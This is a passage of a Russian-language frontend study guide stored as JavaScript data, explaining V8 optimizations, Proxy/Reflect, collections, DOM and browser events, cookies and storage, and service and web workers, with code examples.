Мономорфный код (одни типы) → TurboFan оптимизирует → быстро
Полиморфный код (разные типы в одном месте) → частые деоптимизации → медленно
Большие бандлы → lazy parsing экономит время старта → code splitting помогает
eval(), with, arguments в некоторых случаях отключают оптимизации TurboFan`,score:3},{name:"Преобразование классов в рантайме. Приватные и статичные поля",level:"4",content:`**Преобразование класса:**
\`\`\`js
class User {
  constructor(name) { this.name = name; }
  greet() { ... }         // → User.prototype.greet
  static create() { ... } // → User.create (на самой функции)
}
\`\`\`

**Приватные поля (#):**
\`\`\`js
class User {
  #password = '123';
  changePassword(p) { this.#password = p; } // можно изнутри
}
user.#password; // SyntaxError! Снаружи недоступно
\`\`\`

**3 способа приватности:**
1. \`_\` — соглашение (не настоящая приватность)
2. \`WeakMap\` — настоящая, но громоздко
3. \`#\` — настоящая, встроенная в язык`,score:3},{name:"Оптимизации в V8: Скрытые классы, Inline Caching",level:"4",content:`**Скрытые классы (Hidden Classes)**

**Hashmap** — структура данных "ключ → значение". При чтении \`obj.name\` нужно вычислить хэш строки "name", найти ячейку, разрешить коллизии. Это O(1) в среднем, но с константными накладными расходами на каждое обращение.

V8 не хранит свойства объекта как hashmap — это медленно. Вместо этого он назначает каждому объекту Hidden Class (внутреннее описание формы) — какие свойства есть и по какому смещению в памяти. Тогда \`obj.name\` читается напрямую по смещению — как поле структуры в C, без хэширования.

\`\`\`js
const user = {};        // Hidden Class C0: {}
user.name = 'Alice';    // → C1: { name: offset 0 }
user.age = 25;          // → C2: { name: offset 0, age: offset 8 }
\`\`\`

Два объекта с **одинаковым порядком добавления свойств** разделяют один Hidden Class → V8 переиспользует оптимизации для обоих.

\`\`\`js
// ✅ Оба получат один Hidden Class C2
const a = {}; a.x = 1; a.y = 2;
const b = {}; b.x = 5; b.y = 10;

// ❌ Разные Hidden Classes — разный порядок свойств
const c = {}; c.x = 1; c.y = 2;
const d = {}; d.y = 2; d.x = 1;
\`\`\`

**Практика:** инициализировать все свойства в конструкторе в одинаковом порядке. Динамическое добавление свойств в разном порядке дробит оптимизации.

**delete — опасен:**
Удаление свойства переводит объект в **dictionary mode** (slow mode) — V8 переходит на настоящий hashmap, теряет скрытый класс. Вместо delete → присвой \`undefined\` или \`null\`.

---

**Inline Caching (IC)**

IC — оптимизация на уровне JIT. Каждый раз когда V8 впервые выполняет операцию вроде \`obj.prop\`, он не знает что там внутри — и делает полный поиск. Но он запоминает: "здесь был объект с Hidden Class C2, свойство prop — на смещении 8". При следующем вызове просто проверяет класс и читает по смещению — без хэширования, без поиска.

Проблема возникает когда в одно и то же место кода приходят объекты **разных форм**. V8 должен хранить кэш для каждой встреченной формы — и с каждой новой формой кэш становится дороже:

\`\`\`js
function getX(obj) { return obj.x; }

getX({ x: 1 });           // 1-я форма → IC: Uninitialized → Monomorphic
getX({ x: 2, y: 3 });     // 2-я форма → IC: Monomorphic → Polymorphic
getX({ a: 1, x: 4 });     // 3-я форма → IC: Polymorphic (растёт)
// ... 5+ форм → Megamorphic: кэш выброшен, каждый вызов — полный поиск
\`\`\`

Стадии — это не настройки, а **состояние кэша**. V8 сам переводит IC вперёд по мере того как видит новые формы:

- **Uninitialized** — функция ещё не вызывалась
- **Monomorphic** — одна форма → максимально быстро, кэш из одной записи
- **Polymorphic** — 2–4 формы → кэш на несколько вариантов, сравниваются линейно
- **Megamorphic** — 5+ форм → кэш выброшен, V8 ходит в глобальную хэш-таблицу

**Назад IC не откатывается.** Функция ставшая Megamorphic остаётся такой до следующей перекомпиляции — V8 переключается обратно на hashmap (полный поиск по хэшу при каждом обращении), теряя все преимущества скрытых классов. Поэтому утилитарные функции которые принимают любые объекты (lodash, Object.assign) сознательно написаны так чтобы не полагаться на IC.`,score:3.5},{name:"Proxy и Reflect",level:"4",content:`**Proxy** — обёртка вокруг объекта, которая перехватывает операции над ним. Сам объект не меняется — ты работаешь с прокси, а прокси решает что делать дальше.

\`\`\`js
const handler = {
  get(target, prop, receiver) {
    console.log(\`читаем \${prop}\`);
    return Reflect.get(target, prop, receiver); // стандартное поведение
  },
  set(target, prop, value, receiver) {
    if (typeof value !== 'number') throw new TypeError('только числа');
    return Reflect.set(target, prop, value, receiver);
  },
};

const proxy = new Proxy({}, handler);
proxy.x = 42;   // OK
proxy.x = 'hi'; // TypeError
\`\`\`

**Полный список ловушек** (каждая перехватывает свою операцию):
\`\`\`js
get(target, prop, receiver)              // obj.prop
set(target, prop, value, receiver)       // obj.prop = value
has(target, prop)                        // 'prop' in obj
deleteProperty(target, prop)             // delete obj.prop
apply(target, thisArg, args)             // fn()
construct(target, args)                  // new Fn()
ownKeys(target)                          // Object.keys(), for...in
defineProperty(target, key, desc)        // Object.defineProperty
getOwnPropertyDescriptor(target, key)    // Object.getOwnPropertyDescriptor
getPrototypeOf(target)                   // Object.getPrototypeOf
setPrototypeOf(target, proto)            // Object.setPrototypeOf
isExtensible(target)                     // Object.isExtensible
preventExtensions(target)                // Object.preventExtensions
\`\`\`

---

**Reflect** — зеркало операций JS. Для каждой ловушки Proxy есть соответствующий метод Reflect с той же сигнатурой.

Зачем не просто \`target[prop]\`:
\`\`\`js
// ❌ Без Reflect — теряем receiver, this в геттере будет target, а не proxy
get(target, prop) {
  return target[prop]; // если prop — геттер, this внутри = target
}

// ✅ С Reflect — receiver (прокси) правильно передаётся как this
get(target, prop, receiver) {
  return Reflect.get(target, prop, receiver);
}
\`\`\`
Это критично когда объект наследует геттеры — без receiver они сломаются.

---

**Инварианты Proxy:**
Proxy не может нарушать объектную модель JS. Если свойство \`non-configurable + non-writable\`, get-ловушка обязана вернуть то же значение что в target — иначе TypeError. Движок принудительно проверяет это независимо от твоего кода.

**Proxy.revocable():**
\`\`\`js
const { proxy, revoke } = Proxy.revocable(target, handler);
revoke(); // proxy мёртв → TypeError на любую операцию
\`\`\`
Кейс: временный доступ к объекту. После revoke все ссылки на proxy бесполезны — данные не утекут.

**Где используется:** Vue 3 реактивность (перехват get/set для отслеживания зависимостей), MobX, валидация данных, логирование, мемоизация.`,score:3},{name:"Map, Set, WeakMap, WeakSet",level:"3",content:`**Map** — коллекция ключ-значение. Ключом может быть что угодно (объект, функция, NaN):
\`\`\`js
const map = new Map();
map.set('key', 'value');
map.set(obj, 42);        // объект как ключ
map.get('key');          // 'value'
map.has('key');          // true
map.delete('key');
map.size;                // кол-во записей

// Итерация:
for (const [key, value] of map) { ... }
map.forEach((value, key) => { ... });
[...map.keys()], [...map.values()], [...map.entries()]
\`\`\`
Map vs Object: Map сохраняет порядок вставки, не имеет прототипных ключей, удобнее для итерации.

**Set** — коллекция уникальных значений:
\`\`\`js
const set = new Set([1, 2, 2, 3]); // Set {1, 2, 3}
set.add(4);
set.has(2);   // true
set.delete(2);
set.size;     // 3

// Удаление дублей из массива:
const unique = [...new Set(arr)];
\`\`\`

**WeakMap** — как Map, но:
• Ключи — только объекты
• Слабые ссылки — если объект-ключ больше нигде не используется, GC его удалит вместе с записью
• Нет итерации, нет size
\`\`\`js
const cache = new WeakMap();
cache.set(domNode, computedData); // удалится вместе с domNode
\`\`\`
Кейсы: кэш данных привязанный к объекту, приватные данные классов без утечек памяти.

**WeakSet** — как Set, но только объекты, слабые ссылки, нет итерации:
\`\`\`js
const seen = new WeakSet();
seen.add(obj);
seen.has(obj); // true
\`\`\`
Кейс: отмечать объекты как "обработанные" без удержания в памяти.

**Ключевое отличие Weak-версий:** не мешают сборщику мусора — объект удалится как только исчезнут все остальные ссылки на него.`,score:3.5}]},{id:"browser",title:"БРАУЗЕР И ЕГО ИНСТРУМЕНТЫ",icon:"🌐",color:"#4FC3F7",topics:[{name:"devTools (network, application)",level:"2",content:`**Network:** мониторинг HTTP-запросов, время загрузки, размеры, заголовки, тело ответа. Фильтрация по типу (XHR, JS, CSS, Img). Throttling (3G, offline).

**Application:** cookies, localStorage, sessionStorage, IndexedDB, Service Workers, Cache Storage, Manifests.

**Performance:** запись и анализ производительности, flame chart, CPU profiling.

**Elements:** DOM-дерево, стили, computed styles, box model.

**Console:** логирование, выполнение JS, фильтрация по уровням.

**Memory:** heap snapshots (сравнивать до/после — найти утечки), allocation timeline (что создаётся и удерживается), retained size — реальная память с учётом удерживаемых объектов.

**Coverage:** показывает % неиспользуемого JS/CSS при загрузке страницы. Помогает найти что вынести в lazy-load.

**Local Overrides:** редактировать файлы сайта прямо в DevTools — изменения переживают перезагрузку страницы. Удобно для экспериментов без локального сервера.

**Recorder:** запись пользовательских сценариев → воспроизведение → экспорт в Playwright/Puppeteer скрипты.`},{name:"breakpoints",level:"2",content:`**Типы breakpoints в DevTools:**

• **Line breakpoint** — пауза на конкретной строке кода
• **Conditional breakpoint** — срабатывает при условии (\`user.id === 5\`)
• **DOM breakpoint** — при изменении DOM-узла (subtree, attributes, node removal)
• **XHR/Fetch breakpoint** — при запросе к определённому URL
• **Event listener breakpoint** — при определённом событии (click, scroll)
• **Exception breakpoint** — при выбросе исключения

**Отладка:** Step over (F10), Step into (F11), Step out (Shift+F11), Resume (F8).

**Watch expressions** — отслеживание переменных. **Call Stack** — стек вызовов. **Scope** — текущие переменные.`},{name:"Всплытие и погружение событий",level:"2",content:`**3 фазы события:**
1. **Capturing (погружение)** — от window вниз к целевому элементу
2. **Target** — событие на целевом элементе
3. **Bubbling (всплытие)** — от целевого элемента вверх к window

\`\`\`js
el.addEventListener('click', handler, true);  // capturing
el.addEventListener('click', handler, false); // bubbling (по умолчанию)
\`\`\`

**event.stopPropagation()** — останавливает всплытие/погружение
**event.stopImmediatePropagation()** — + отменяет остальные обработчики на этом элементе
**event.preventDefault()** — отменяет действие по умолчанию (НЕ останавливает всплытие)

**Делегирование событий:** вешаем один обработчик на родителя, проверяем \`event.target\`.`},{name:"Основные браузерные события",level:"2",content:`**Мышь:**
\`\`\`
click       — клик (mousedown + mouseup на одном элементе)
dblclick    — двойной клик
mousedown   — кнопка нажата
mouseup     — кнопка отпущена
mousemove   — движение мыши
mouseenter  — вошла на элемент (не всплывает, не триггерится на детях)
mouseleave  — вышла с элемента (не всплывает)
mouseover   — вошла на элемент или дочерний (всплывает)
mouseout    — вышла с элемента или дочернего (всплывает)
contextmenu — правый клик
wheel       — колесо мыши
\`\`\`
mouseenter/mouseleave — для одного элемента, не реагируют на детей. mouseover/mouseout — всплывают, срабатывают при переходе между дочерними.

**Клавиатура:**
\`\`\`
keydown   — клавиша нажата (повторяется при удержании)
keyup     — клавиша отпущена
keypress  — устарел, не использовать
\`\`\`

**Форма:**
\`\`\`
submit    — отправка формы
reset     — сброс формы
change    — значение изменено И потерян фокус (input, select, checkbox)
input     — значение изменяется в реальном времени (каждый символ)
focus     — элемент получил фокус (не всплывает)
blur      — элемент потерял фокус (не всплывает)
focusin   — как focus, но всплывает
focusout  — как blur, но всплывает
\`\`\`

**Документ и окно:**
\`\`\`
DOMContentLoaded — DOM построен, стили/картинки могут не загрузиться
load             — всё загружено (стили, картинки, шрифты)
beforeunload     — перед закрытием (можно показать предупреждение)
unload           — страница закрывается
resize           — изменение размера окна
scroll           — прокрутка
visibilitychange — вкладка стала активной/неактивной
\`\`\`

**Drag & Drop:**
\`\`\`
dragstart  — начало перетаскивания
drag       — во время перетаскивания
dragend    — конец перетаскивания
dragenter  — элемент вошёл в зону drop
dragleave  — элемент вышел из зоны drop
dragover   — над зоной drop (нужен preventDefault() чтобы drop сработал)
drop       — элемент брошен
\`\`\`

**Touch (мобильные):**
\`\`\`
touchstart  — палец коснулся экрана
touchmove   — палец движется
touchend    — палец убран
touchcancel — касание прервано (звонок, уведомление)
\`\`\`

**Буфер обмена:**
\`\`\`
copy   — копирование
cut    — вырезание
paste  — вставка
\`\`\`

**Медиа:**
\`\`\`
play          — воспроизведение началось
pause         — пауза
ended         — воспроизведение закончено
timeupdate    — текущее время изменилось
volumechange  — громкость изменилась
loadeddata    — данные загружены
\`\`\`

**Анимации и переходы:**
\`\`\`
animationstart  — CSS-анимация началась
animationend    — CSS-анимация закончилась
transitionend   — CSS-transition закончился
\`\`\`

**Intersection Observer** — не событие, но ключевой API. Срабатывает когда элемент появляется или исчезает из viewport. Используется для lazy-loading, infinite scroll, анимаций при скролле:
\`\`\`js
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      loadImage(entry.target);
      observer.unobserve(entry.target); // перестать следить
    }
  });
}, { threshold: 0.1 }); // 0.1 = срабатывает когда 10% элемента видно

observer.observe(document.querySelector('.lazy-img'));
\`\`\`

**Passive listeners** — подсказка браузеру что обработчик не вызовет preventDefault(). Браузер не ждёт выполнения обработчика перед прокруткой — скролл плавнее:
\`\`\`js
document.addEventListener('scroll', handler, { passive: true });
document.addEventListener('touchmove', handler, { passive: true });
\`\`\``},{name:"Что такое DOM. JS Методы работы с узлами",level:"2",content:`**DOM (Document Object Model)** — древовидное представление HTML-документа. Каждый HTML-тег — узел (node).

**Поиск:**
\`\`\`js
document.getElementById('id')
document.querySelector('.class')      // первый
document.querySelectorAll('.class')   // все (статическая коллекция)
document.getElementsByClassName()     // живая коллекция
\`\`\`

**Создание/модификация:**
\`\`\`js
document.createElement('div')
element.append(child)      // в конец
element.prepend(child)     // в начало
element.before(sibling)    // перед
element.after(sibling)     // после
element.remove()           // удалить
element.cloneNode(true)    // глубокое клонирование
\`\`\`

**Атрибуты:** getAttribute, setAttribute, removeAttribute, dataset (data-*).
**Классы:** classList.add, remove, toggle, contains.

**DocumentFragment** — лёгкий узел вне DOM. Добавляй элементы пакетно, потом вставь один раз → один reflow:
\`\`\`js
const frag = document.createDocumentFragment();
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  frag.appendChild(li);
});
list.appendChild(frag); // единственный reflow
\`\`\`

**MutationObserver** — следит за изменениями в DOM (замена устаревшего MutationEvents):
\`\`\`js
const observer = new MutationObserver((mutations) => {
  mutations.forEach(m => console.log(m.type, m.addedNodes, m.attributeName));
});
observer.observe(element, {
  childList: true,    // добавление/удаление дочерних узлов
  subtree: true,      // всё поддерево
  attributes: true,   // изменения атрибутов
  characterData: true // изменения текстового контента
});
observer.disconnect();
\`\`\`
Используется в: React DevTools, rich text редакторах, analytics трекерах.`},{name:"iframe",level:"3",content:`**iframe** — встраивает другую HTML-страницу внутрь текущей.

\`\`\`html
<iframe src="https://example.com" sandbox="allow-scripts"></iframe>
\`\`\`

**Безопасность:**
• **sandbox** — ограничивает возможности: allow-scripts, allow-same-origin, allow-forms, allow-popups
• **Same-Origin Policy** — доступ к содержимому iframe только с того же домена
• **postMessage** — безопасное общение между окнами разных доменов

\`\`\`js
// Родитель → iframe
iframe.contentWindow.postMessage(data, 'https://target.com');

// iframe → родитель
window.parent.postMessage(data, 'https://parent.com');

// Приём
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://trusted.com') return;
  console.log(e.data);
});
\`\`\`

**X-Frame-Options** — заголовок, запрещающий встраивание сайта в iframe.`},{name:"Отладка WebSocket в браузере",level:"3",content:`В DevTools → Network → вкладка **WS** (WebSocket):
• Видны все WebSocket-соединения
• **Messages** — отправленные (зелёные) и полученные (красные) сообщения
• **Headers** — заголовки handshake (Upgrade: websocket)
• **Timing** — время установки соединения

Можно фильтровать по содержимому сообщений, видеть бинарные данные. Полезно для дебага real-time приложений (чаты, уведомления, торговые платформы).`},{name:"Базовое понимание cookies",level:"3",content:`**Cookie** — небольшой фрагмент данных (до ~4 KB), который сервер устанавливает в браузере через заголовок Set-Cookie. Браузер автоматически прикладывает cookie к каждому HTTP-запросу к тому же домену через заголовок Cookie.

Именно поэтому cookies используют для аутентификации — сервер один раз установил session-id, и браузер сам носит его при каждом запросе, не требуя ничего от JS-кода.

**Как это выглядит на уровне HTTP:**
\`\`\`
← Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Max-Age=86400
→ Cookie: session=abc123
\`\`\`

**Установка через JS:**
\`\`\`js
// Записать
document.cookie = "theme=dark; max-age=2592000; path=/";

// Прочитать — возвращает ВСЕ cookie строкой через ";"
document.cookie; // "theme=dark; lang=ru"

// Удалить — установить max-age=0 или expires в прошлом
document.cookie = "theme=; max-age=0; path=/";
\`\`\`
API намеренно неудобный — нет нативного getItem/removeItem. Обычно используют библиотеку js-cookie или пишут хелпер.

**Атрибуты безопасности:**

**HttpOnly** — cookie недоступна из JS (document.cookie её не видит). Защита от XSS.

**Secure** — cookie отправляется только по HTTPS.

**SameSite** — контролирует отправку cookie в кросс-сайтовых запросах:
\`\`\`
Strict — не отправляется ни в каких кросс-сайтовых запросах
Lax    — не отправляется при CSRF-запросах (POST, img, iframe),
         но отправляется при top-level навигации. Дефолт в современных браузерах.
None   — отправляется всегда, требует Secure. Для third-party (виджеты, аналитика).
\`\`\`

**path и domain:**
\`\`\`
path=/admin   — cookie видна только для /admin и его подпутей
domain=.example.com — cookie доступна для всех поддоменов (sub.example.com, api.example.com)
\`\`\`
Без явного domain — cookie принадлежит только точному домену, поддомены не видят.

**max-age vs expires:**
\`\`\`js
max-age=3600       // секунды от текущего момента (предпочтительнее)
expires=Wed, 21 Oct 2026 07:28:00 GMT  // конкретная дата (зависит от часов клиента)
\`\`\`
Без обоих — session cookie: живёт до закрытия браузера (не вкладки).

**Типы cookies:**
\`\`\`
Session cookie    — без max-age/expires, удаляется при закрытии браузера
Persistent cookie — с max-age/expires, хранится до истечения срока
First-party       — домен совпадает с текущим сайтом
Third-party       — домен отличается (пиксели аналитики, рекламные трекеры)
                    Браузеры блокируют по умолчанию (Safari ITP, Chrome Privacy Sandbox)
\`\`\`

**Ограничения:**
• ~4 KB на одну cookie
• ~50 cookies на домен (в зависимости от браузера)
• Отправляются с каждым запросом — не хранить большие данные (для этого localStorage)

**Cookie vs localStorage:**
\`\`\`
Cookie         — автоматически летит на сервер, есть HttpOnly/Secure, 4 KB
localStorage   — только JS, не уходит на сервер, нет HttpOnly, 5-10 MB
\`\`\`
Для аутентификации — cookie с HttpOnly. Для настроек UI — localStorage.`},{name:"localStorage и sessionStorage",level:"3",content:`**localStorage** — хранит данные без срока истечения, переживает закрытие браузера. Область видимости: домен + протокол (http и https — разные хранилища).

**sessionStorage** — данные живут до закрытия вкладки. Уникально для каждой вкладки: две вкладки одного сайта — два разных sessionStorage. Дублируется при открытии вкладки через Ctrl+Click (копируется на момент открытия, дальше независимо).

**API — синхронный (одинаковый для обоих):**
\`\`\`js
localStorage.setItem('key', JSON.stringify(value));
const val = JSON.parse(localStorage.getItem('key')); // null если нет
localStorage.removeItem('key');
localStorage.clear();
localStorage.length;
localStorage.key(0); // ключ по индексу

// sessionStorage — тот же интерфейс, другая область видимости
sessionStorage.setItem('step', '2');
sessionStorage.getItem('step'); // '2'
\`\`\`

**Нюансы:**
• Хранит только строки — объекты нужно JSON.stringify/parse
• getItem несуществующего ключа возвращает null, не undefined
• Синхронный API — блокирует main thread при большом объёме данных
• ~5 MB на домен (зависит от браузера, в некоторых 10 MB)
• Недоступен в Web Workers и Service Workers (там — IndexedDB)
• В режиме инкогнито очищается при закрытии окна (ведёт себя как sessionStorage)

**Событие storage:**
\`\`\`js
window.addEventListener('storage', (e) => {
  e.key;        // изменённый ключ (null при clear())
  e.oldValue;
  e.newValue;
  e.url;        // страница, которая изменила
  e.storageArea // localStorage или sessionStorage
});
\`\`\`
Срабатывает только в других вкладках/окнах того же домена — не в той, что изменила. Используется для синхронизации состояния между вкладками.

**localStorage vs sessionStorage vs cookie:**
\`\`\`
                localStorage  sessionStorage  cookie
Срок жизни      бессрочно     до закрытия вк. задаётся явно
Объём           ~5 MB         ~5 MB           ~4 KB
Уходит на сервер нет          нет             да (каждый запрос)
Доступ из JS    да            да              да (если нет HttpOnly)
Вкладки         общий         изолирован      общий
\`\`\``},{name:"Базовое понимание Selection и Range",level:"3",content:`**Range** — объект, описывающий фрагмент DOM от стартовой до конечной точки. Точка = (node, offset), где offset для текстового узла — позиция символа, для элемента — индекс дочернего узла.

\`\`\`js
const range = document.createRange();

range.setStart(textNode, 2);       // с 3-го символа текстового узла
range.setEnd(textNode, 7);         // по 7-й
range.selectNode(el);              // весь элемент включая тег
range.selectNodeContents(el);      // только содержимое элемента
range.collapse(true);              // схлопнуть в начало (false — в конец)

range.toString();                  // текст внутри
range.getBoundingClientRect();     // координаты для позиционирования тултипа
range.cloneContents();             // DocumentFragment — копия без удаления
range.extractContents();           // DocumentFragment — вырезает из DOM
range.deleteContents();            // удаляет содержимое
range.insertNode(node);            // вставить узел в начало range
range.surroundContents(node);      // обернуть содержимое в node
\`\`\`

**Selection** — то что выделил пользователь; может содержать несколько Range (на практике браузеры поддерживают один).

\`\`\`js
const sel = window.getSelection();

sel.rangeCount;           // количество Range (обычно 0 или 1)
sel.getRangeAt(0);        // получить Range по индексу
sel.toString();           // выделенный текст
sel.isCollapsed;          // true если курсор без выделения (каретка)
sel.anchorNode;           // узел где началось выделение
sel.anchorOffset;         // смещение в anchorNode
sel.focusNode;            // узел где закончилось выделение
sel.focusOffset;

sel.removeAllRanges();    // снять выделение
sel.addRange(range);      // программно выделить
sel.collapse(node, offset); // переместить каретку
sel.selectAllChildren(el);  // выделить всё содержимое элемента
\`\`\`

**anchor vs focus:** anchor — где пользователь нажал мышь, focus — где отпустил. При выделении снизу вверх focus будет раньше anchor в DOM.

**Типичные задачи:**
\`\`\`js
// Получить координаты выделения (для тултипа форматирования)
const rect = sel.getRangeAt(0).getBoundingClientRect();

// Программно выделить текст в элементе
const range = document.createRange();
range.selectNodeContents(document.getElementById('title'));
sel.removeAllRanges();
sel.addRange(range);

// Вставить HTML в позицию курсора (contenteditable)
const range = sel.getRangeAt(0);
range.deleteContents();
range.insertNode(document.createTextNode('вставленный текст'));
\`\`\`

**Применение:** rich-text редакторы (Slate, TipTap), подсветка найденного текста, кастомные контекстные меню по выделению, аннотации.`},{name:"Особенности работы с браузерными событиями",level:"3",content:`**Throttle** — не чаще чем раз в N мс (scroll, resize).
**Debounce** — ждёт N мс после последнего вызова (input поиска).

**Опции addEventListener:**

**once** — обработчик срабатывает один раз и автоматически удаляется:
\`\`\`js
button.addEventListener('click', handler, { once: true });
\`\`\`

**passive** — обещаем браузеру что не вызовем preventDefault(). Браузер не ждёт выполнения обработчика перед прокруткой → плавный скролл:
\`\`\`js
document.addEventListener('scroll', handler, { passive: true });
document.addEventListener('touchmove', handler, { passive: true });
\`\`\`
Важно для scroll/touchmove — без passive браузер каждый раз ждёт, не вызван ли preventDefault(), и тормозит прокрутку.

**capture** — обработчик на фазе погружения (по умолчанию false — всплытие):
\`\`\`js
el.addEventListener('click', handler, { capture: true });
// или сокращённо:
el.addEventListener('click', handler, true);
\`\`\`

**Удаление обработчика — нужна та же ссылка на функцию:**
\`\`\`js
// ❌ Не работает — каждый раз новая функция:
el.addEventListener('click', () => handler());
el.removeEventListener('click', () => handler());

// ✅ Работает — одна ссылка:
const fn = () => handler();
el.addEventListener('click', fn);
el.removeEventListener('click', fn);
\`\`\`
Та же проблема с методами класса — this.handler каждый раз одна ссылка, а () => this.handler() — нет.

**Делегирование событий** — один обработчик на родителе вместо N обработчиков на детях. Работает благодаря всплытию:
\`\`\`js
// Плохо — 1000 обработчиков:
items.forEach(item => item.addEventListener('click', handler));

// Хорошо — один обработчик:
list.addEventListener('click', (e) => {
  const item = e.target.closest('.item');
  if (!item || !list.contains(item)) return; // защита от кликов вне .item
  handler(item);
});
\`\`\`
closest() поднимается по DOM вверх — работает даже если кликнули на дочерний элемент внутри .item. contains() защищает от случая когда closest нашёл элемент за пределами контейнера.

**Custom Events:**
\`\`\`js
const event = new CustomEvent('myEvent', { detail: { id: 1 }, bubbles: true });
element.dispatchEvent(event);
\`\`\``},{name:"Живые коллекции, методы обработки и преобразования в массив",level:"3",content:`**Живая коллекция** — автоматически обновляется при изменении DOM:
\`\`\`js
const divs = document.getElementsByTagName('div'); // живая
// Добавили div → divs.length увеличится
\`\`\`

**Статическая коллекция** — снимок на момент вызова:
\`\`\`js
const divs = document.querySelectorAll('div'); // статическая
// Добавили div → divs.length НЕ изменится
\`\`\`

**Преобразование в массив:**
\`\`\`js
Array.from(collection)
[...collection]
Array.prototype.slice.call(collection)
\`\`\`

Живые: getElementsByClassName, getElementsByTagName, children
Статические: querySelectorAll`},{name:"Service workers",level:"4",content:`**Service Worker** — JS скрипт который:
• Работает в отдельном потоке (не блокирует UI)
• Является прокси между браузером и сетью
• Живёт дольше страницы — продолжает работать когда вкладка закрыта
• Работает только на HTTPS (или localhost)
• Нет доступа к DOM

**Регистрация:**
\`\`\`js
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(reg => console.log('SW зарегистрирован', reg))
    .catch(err => console.log('Ошибка', err));
}
\`\`\`

**Жизненный цикл:** Регистрация → Install → Activate → Fetch

**Install** — SW установился впервые или получил обновление. Здесь загружают в кэш файлы нужные для офлайн-работы. Если хоть один файл не загрузился — install падает и SW не активируется. \`skipWaiting()\` — без него новый SW висит в состоянии "waiting" пока пользователь не закроет все вкладки; с ним — сразу переходит в activate.

**Activate** — SW стал активным. Здесь удаляют кэши предыдущих версий: старый SW писал в \`'v1'\`, новый пишет в \`'v2'\` — \`'v1'\` больше не нужен, удаляем чтобы не копился мусор. \`clients.claim()\` — без него уже открытые вкладки продолжают работать со старым SW до перезагрузки; с ним — новый SW перехватывает их немедленно.
\`\`\`js
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('v1').then(cache => cache.addAll(['/index.html', '/app.js']))
  );
  self.skipWaiting(); // активировать немедленно, не ждать закрытия вкладок
});

self.addEventListener('activate', (event) => {
  event.waitUntil(
    caches.keys().then(keys =>
      Promise.all(keys.filter(k => k !== 'v1').map(k => caches.delete(k)))
    )
  );
  self.clients.claim(); // взять контроль над всеми открытыми вкладками
});
\`\`\`

**Стратегии кэширования:**

**Cache First** — сначала кэш, потом сеть (для статики):
\`\`\`js
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.match(event.request).then(cached => cached || fetch(event.request))
  );
});
\`\`\`

**Network First** — сначала сеть, при ошибке кэш (для API):
\`\`\`js
self.addEventListener('fetch', (event) => {
  event.respondWith(
    fetch(event.request).catch(() => caches.match(event.request))
  );
});
\`\`\`

**Stale While Revalidate** — отдаём кэш сразу, обновляем в фоне:
\`\`\`js
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.open('v1').then(cache =>
      cache.match(event.request).then(cached => {
        const fetchPromise = fetch(event.request).then(response => {
          cache.put(event.request, response.clone());
          return response;
        });
        return cached || fetchPromise;
      })
    )
  );
});
\`\`\`

**Push уведомления:**
\`\`\`js
Notification.requestPermission().then(permission => { /* подписываемся */ });

self.addEventListener('push', (event) => {
  const data = event.data.json();
  event.waitUntil(
    self.registration.showNotification(data.title, { body: data.body, icon: '/icon.png' })
  );
});
\`\`\`

**Background Sync** — откладывает запросы до появления сети:
\`\`\`js
navigator.serviceWorker.ready.then(sw => sw.sync.register('send-message'));

self.addEventListener('sync', (event) => {
  if (event.tag === 'send-message') event.waitUntil(sendPendingMessages());
});
\`\`\`

**Возможности:** кэширование, офлайн-режим, push-уведомления, background sync, перехват и модификация любых запросов.`},{name:"Web-workers",level:"4",content:`**Web Worker** — запускает JS в отдельном потоке, не блокируя main thread и UI. Нет доступа к DOM, window, document — только вычисления и сеть (fetch).

**Когда использовать:** тяжёлые вычисления (парсинг, шифрование, обработка изображений, сортировка больших массивов) — всё что вешает интерфейс дольше ~16ms.

**Создание и общение через postMessage:**
\`\`\`js
// main.js
const worker = new Worker('./worker.js');

worker.postMessage({ type: 'compute', data: bigArray }); // отправить

worker.onmessage = (e) => console.log('результат:', e.data);
worker.onerror = (e) => console.error(e.message);

worker.terminate(); // убить воркер
\`\`\`
\`\`\`js
// worker.js
self.onmessage = (e) => {
  const result = heavyComputation(e.data.data);
  self.postMessage(result); // отправить обратно
};
\`\`\`
Данные передаются копированием (structured clone) — изменения в воркере не влияют на оригинал.

**Transferable Objects** — передача без копирования, данные перемещаются (ArrayBuffer становится недоступен в отправителе):
\`\`\`js
const buffer = new ArrayBuffer(1024 * 1024 * 32); // 32MB
worker.postMessage(buffer, [buffer]); // второй аргумент — список transferable
// buffer здесь теперь пустой (detached)
\`\`\`
Критично для больших бинарных данных — без transfer копирование 32MB блокирует поток.

**SharedWorker** — один экземпляр воркера на все вкладки одного домена. Общение через port:
\`\`\`js
// main.js
const worker = new SharedWorker('./shared.js');
worker.port.start();
worker.port.postMessage('hello');
worker.port.onmessage = (e) => console.log(e.data);
\`\`\`
\`\`\`js
// shared.js
self.onconnect = (e) => {
  const port = e.ports[0];
  port.onmessage = (e) => port.postMessage('ответ: ' + e.data);
};
\`\`\`
Применение: общий кэш данных, синхронизация состояния между вкладками.

**Inline Worker** — без отдельного файла:
\`\`\`js
const blob = new Blob([
  \`self.onmessage = (e) => self.postMessage(e.data * 2);\`
], { type: 'application/javascript' });
const worker = new Worker(URL.createObjectURL(blob));
\`\`\`

**Worker vs Service Worker:**
\`\`\`
Web Worker      — вычисления в фоне, живёт пока страница открыта
Service Worker  — прокси для сети, живёт независимо от страницы
\`\`\``},{name:"Как веб-приложение превратить в PWA",level:"4",content:`**PWA (Progressive Web App)** — веб-приложение которое ведёт себя как нативное: устанавливается на устройство, работает офлайн, получает push-уведомления.

**3 обязательных компонента:**
1. **HTTPS** — обязательно для SW и установки
2. **Web App Manifest** — описывает приложение
3. **Service Worker** — кэширование и офлайн

**Web App Manifest:**
\`\`\`json
{
  "name": "My Application",
  "short_name": "MyApp",
  "start_url": "/",
  "scope": "/",
  "display": "standalone",
  "background_color": "#ffffff",
  "theme_color": "#000000",
  "icons": [
    { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png" },
